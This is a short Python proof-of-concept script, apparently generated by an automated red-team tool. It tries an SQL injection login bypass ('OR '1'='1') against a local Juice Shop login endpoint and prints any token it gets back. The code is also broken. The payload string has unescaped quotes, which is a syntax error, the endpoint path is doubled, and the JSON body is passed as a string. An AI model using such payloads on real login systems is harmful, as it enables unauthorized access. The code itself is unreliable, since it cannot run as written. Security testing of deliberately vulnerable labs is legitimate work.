#!/usr/bin/env python3
"""
PoC: SQL Injection - http://localhost:3000/rest/user/login
Generated from VibeCheck Red Team mission

VULNERABILITY DETAILS:
The response contains a valid authentication token.

Run this script to reproduce the vulnerability.
"""

import requests

TARGET = "http://localhost:3000/rest/user/login"
PAYLOAD = "{"email":"admin@juice-sh.op' OR '1'='1","password":"x"}"

def main():
    print("[*] Testing SQL Injection on " + TARGET)
    print("[*] Payload: " + str(PAYLOAD))
    
    try:
        response = requests.post(
            TARGET + "/rest/user/login",
            json=PAYLOAD,
            timeout=10
        )
        
        print("[*] Response status: " + str(response.status_code))
        
        if "authentication" in response.text or "token" in response.text:
            print("[+] VULNERABLE! SQL injection successful")
            print("[*] Response:")
            print(response.text[:500])
        else:
            print("[-] Not vulnerable or different response")
            
    except Exception as e:
        print("[!] Error: " + str(e))

if __name__ == "__main__":
    main()
